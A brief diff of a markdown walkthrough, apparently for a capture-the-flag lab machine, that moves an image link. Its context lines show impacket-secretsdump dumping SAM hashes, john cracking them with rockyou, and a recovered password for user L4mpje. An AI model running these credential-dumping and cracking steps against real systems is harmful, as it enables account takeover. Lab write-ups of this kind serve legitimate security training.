@@ -117,6 +117,7 @@ cd /tmp
 ```
 impacket-secretsdump -sam SAM -system SYSTEM local > file
 ```
+![image](https://user-images.githubusercontent.com/5285547/124928250-60454280-dff7-11eb-8a71-52581bbf9f9d.png)
 
 ```
 john file.sam --wordlist=/usr/share/wordlists/rockyou.txt --format=NT
@@ -125,7 +126,7 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 bureaulampje     (L4mpje)
 ```
 
-![image](https://user-images.githubusercontent.com/5285547/124928250-60454280-dff7-11eb-8a71-52581bbf9f9d.png)
+
 
 
 
